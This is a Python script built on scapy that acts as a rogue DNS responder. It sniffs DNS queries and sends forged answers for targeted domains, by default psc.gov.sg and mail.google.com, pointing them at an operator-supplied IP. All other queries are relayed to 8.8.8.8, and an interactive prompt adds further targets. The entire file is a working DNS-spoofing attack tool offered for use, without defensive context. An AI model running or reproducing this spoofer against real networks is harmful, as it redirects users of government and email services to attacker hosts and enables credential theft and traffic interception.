from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP

spoof_domains = ["psc.gov.sg", "mail.google.com"]

def dns_responder(dns_ip: str, dns_server_ip, interface):

    #local function to foward packets that are not of the domain to spoof
    def forward_dns(pkt: IP):
        print(f"Forwarding: {pkt[DNSQR].qname}")
        response = sr1(IP(dst='8.8.8.8')/UDP(sport=pkt[UDP].sport)/DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),verbose=0,)
        response_pkt = IP(dst=pkt[IP].src, src=dns_server_ip)/UDP(dport=pkt[UDP].sport)/DNS()
        response_pkt[DNS] = response[DNS]
        send(response_pkt, verbose=0)
        return f"Responding to {pkt[IP].src}"

    #local function to get the pkt and determine if to send a spoofed reply or foward to actual google dns server
    def get_response(pkt: IP):
        if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
            
            for domain in spoof_domains:
                if domain in str(pkt["DNS Question Record"].qname) or domain in pkt["DNS Question Record"].qname.decode('utf-8') :
                    spoofed_pkt = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname=domain + ".",rdata=dns_ip))
                    send(spoofed_pkt, iface=interface)
                    return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
                
            else:
                # make DNS query, capturing the answer and send the answer
                return forward_dns(pkt)

    return get_response


def main():
    #Retrieve settings from user
    interface = input("Enter interface to sniff on: ").strip()
    dns_server_ip = input("Enter IP of rogue dns server: ").strip()  # DNS server IP
    pkt_filter = f"udp port 53 and ip dst {dns_server_ip}"
    
    
    #Verifying domains to spoof
    print("Current domains to spoof: ")
    for domain in spoof_domains:
        print(domain)
    
    add = input("Any domains to add or delete (y/n): ").strip()
    if add == "y":
        decision = input("Add (a) OR delete (d) domain: ").strip()
        
        if decision == "a":
            number_to_add = int(input("How many: ").strip())
            for i in range(number_to_add):
                domain = input("Enter domain (without http and www): ").strip()
                spoof_domains.append(domain)
        
        elif decision == "d":
            number_to_delete = int(input("How many: ").strip())
            for i in range(number_to_delete):
                domain = input("Enter domain (without http and www): ").strip()
                spoof_domains.remove(domain)

    
    #Start the spoofing
    print("Starting DNS spoofing.")
    sniff(filter=pkt_filter, prn=dns_responder(dns_server_ip, dns_server_ip, interface), iface=interface)
    


if __name__ == "__main__":
    main()